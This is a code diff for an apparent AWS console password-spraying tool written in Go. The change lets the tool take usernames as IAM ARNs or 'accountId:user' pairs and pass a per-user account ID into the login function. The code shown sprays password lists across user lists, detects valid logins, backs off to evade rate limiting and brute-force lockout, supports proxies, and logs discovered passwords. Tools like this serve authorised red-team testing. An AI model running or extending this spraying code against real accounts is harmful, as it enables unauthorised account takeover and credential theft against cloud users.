@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"regexp"
 	"strings"
 	"time"
 
@@ -26,6 +27,12 @@ type AwsLoginResponse struct {
 		Text        string `json:"text"`
 		MFAType     string `json:"mfaType"`
 	} `json:"properties"`
+}
+
+// User Details Structure
+type userDetails struct {
+	UserName  string
+	AccountID string
 }
 
 // status codes enum for error handling
@@ -77,8 +84,8 @@ func Execute() {
 }
 
 func init() {
-	rootCmd.Flags().StringVarP(&fAccountID, "accountID", "a", "", "AWS Account ID (required)")
-	rootCmd.Flags().StringVarP(&fUserfile, "userfile", "u", "", "Username string or file (required)")
+	rootCmd.Flags().StringVarP(&fAccountID, "accountID", "a", "", "AWS Account ID (required unless username is ARN)")
+	rootCmd.Flags().StringVarP(&fUserfile, "userfile", "u", "", "Username string or file (required) can be user, arn, or acctId:user format")
 	rootCmd.Flags().StringVarP(&fPassfile, "passfile", "p", "", "Password string or file (required)")
 	rootCmd.Flags().IntVarP(&fSleep, "sleep", "z", 0, "Optional Time to sleep between password requests")
 	rootCmd.Flags().IntVarP(&fDelay, "delay", "d", 0, "Optional Time Delay Between Requests for rate limiting")
@@ -86,7 +93,6 @@ func init() {
 	rootCmd.Flags().StringVarP(&fProxy, "proxy", "x", "", "HTTP or Socks proxy URL & Port. Schema: proto://ip:port")
 	rootCmd.Flags().BoolVarP(&fStopOnSuccess, "stopOnSuccess", "s", false, "Stop password spraying on successful hit")
 
-	rootCmd.MarkFlagRequired("accountID")
 	rootCmd.MarkFlagRequired("userfile")
 	rootCmd.MarkFlagRequired("passfile")
 }
@@ -111,7 +117,8 @@ func spray() {
 		Transport: transport,
 	}, opts)
 
-	var usernameList, passwordList []string
+	var usernameList []userDetails
+	var passwordList []string
 	var userString, passString string
 
 	// Open the files
@@ -130,14 +137,47 @@ func spray() {
 	if len(userString) == 0 {
 		scanner := bufio.NewScanner(userfileHandle)
 		for scanner.Scan() {
-			usernameList = append(usernameList, scanner.Text())
+			var user userDetails
+			file_entry := scanner.Text()
+			res := regexp.MustCompile(`^\d{12}:`)
+			if strings.Contains(file_entry, "arn:aws:iam::") {
+				user.UserName = strings.Split(file_entry, ":")[4]
+				user.AccountID = strings.Split(file_entry, "/")[1]
+			} else if res.FindString(file_entry) != "" {
+				user.UserName = strings.Split(file_entry, ":")[1]
+				user.AccountID = strings.Split(file_entry, ":")[0]
+			} else {
+				if fAccountID == "" {
+					log.Printf("\t[!] ERROR:\tAccountID not provided in username or CLI argument.")
+					panic(1)
+				}
+				user.UserName = file_entry
+				user.AccountID = fAccountID
+			}
+			usernameList = append(usernameList, user)
 		}
 		if err := scanner.Err(); err != nil {
 			log.Printf("\t[!] ERROR:\tReading Userfile Failure. \tMessage: %s", err.Error())
 			panic(err)
 		}
 	} else {
-		usernameList = []string{userString}
+		var user userDetails
+		res := regexp.MustCompile(`^\d{12}:`)
+		if strings.Contains(userString, "arn:aws:iam::") {
+			user.UserName = strings.Split(userString, ":")[4]
+			user.AccountID = strings.Split(userString, "/")[1]
+		} else if res.FindString(userString) != "" {
+			user.UserName = strings.Split(userString, ":")[1]
+			user.AccountID = strings.Split(userString, ":")[0]
+		} else {
+			if fAccountID == "" {
+				log.Printf("\t[!] ERROR:\tAccountID not provided in username or CLI argument.")
+				panic(1)
+			}
+			user.UserName = userString
+			user.AccountID = fAccountID
+		}
+		usernameList = append(usernameList, user)
 	}
 
 	// Read password file
@@ -160,7 +200,7 @@ func spray() {
 loop:
 	for i, pass := range passwordList {
 		for _, user := range usernameList {
-			check := attemptLogin(client, user, pass, fAccountID, fDelay, fJitter, 1)
+			check := attemptLogin(client, user.UserName, pass, user.AccountID, fDelay, fJitter, 1)
 			// connection failures and stop on succes
 			if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS) {
 				break loop
@@ -210,10 +250,10 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 	// If this exception occurs, that means a valid password was observed as a bunch of long cookies are made.
 	if err != nil {
 		if strings.Contains(err.Error(), "server response headers exceeded") {
-			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", fAccountID, username, password)
+			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", accountID, username, password)
 			return SUCCESS
 		} else {
-			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tHTTP Stack Failure. \tMessage: %s", fAccountID, username, err.Error())
+			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tHTTP Stack Failure. \tMessage: %s", accountID, username, err.Error())
 			return CONNFAIL
 		}
 	} else {
@@ -221,7 +261,7 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 
 		// check for bruteforce ratelimiting
 		if resp.StatusCode == 429 {
-			log.Printf("[!] WARNING:\tarn:aws:iam::%s:user/%s\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n", fAccountID, username)
+			log.Printf("[!] WARNING:\tarn:aws:iam::%s:user/%s\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n", accountID, username)
 			time.Sleep(4 * time.Second)
 			return attemptLogin(client, username, password, accountID, delay, jitter, 1)
 		}
@@ -230,17 +270,17 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 		body, _ := io.ReadAll(resp.Body)
 		var loginResponse AwsLoginResponse
 		if err2 := json.Unmarshal(body, &loginResponse); err2 != nil {
-			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tUnmarshal JSON Failure. AWS probably changed JSON response structure. \tMessage: %s", fAccountID, username, err.Error())
+			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tUnmarshal JSON Failure. AWS probably changed JSON response structure. \tMessage: %s", accountID, username, err.Error())
 			return FAILED
 		}
 
 		// Check for success and failure conditions
 		if loginResponse.State == "SUCCESS" {
 			if loginResponse.Properties.Result == "MFA" {
-				log.Printf("[*] MFA:\tarn:aws:iam::%s:user/%s\tValid username detected. Account Requires MFA. Skipping this user.\n", fAccountID, username)
+				log.Printf("[*] MFA:\tarn:aws:iam::%s:user/%s\tValid username detected. Account Requires MFA. Skipping this user.\n", accountID, username)
 				return ACCOUNTMFA
 			}
-			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", fAccountID, username, password)
+			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", accountID, username, password)
 			return SUCCESS
 		} else {
 			if strings.Contains(loginResponse.Properties.Text, "many invalid passwords have been used") {
@@ -250,9 +290,8 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 				// increase the time delay since we have hit the bruteforce ratelimit check
 				return attemptLogin(client, username, password, accountID, delay, jitter, (bfSleepRounds + 1))
 			}
-			log.Printf("[-] FAIL:\tarn:aws:iam::%s:user/%s\tInvalid Password: %s\n", fAccountID, username, password)
+			log.Printf("[-] FAIL:\tarn:aws:iam::%s:user/%s\tInvalid Password: %s\n", accountID, username, password)
 			return FAILED
 		}
 	}
 }
-
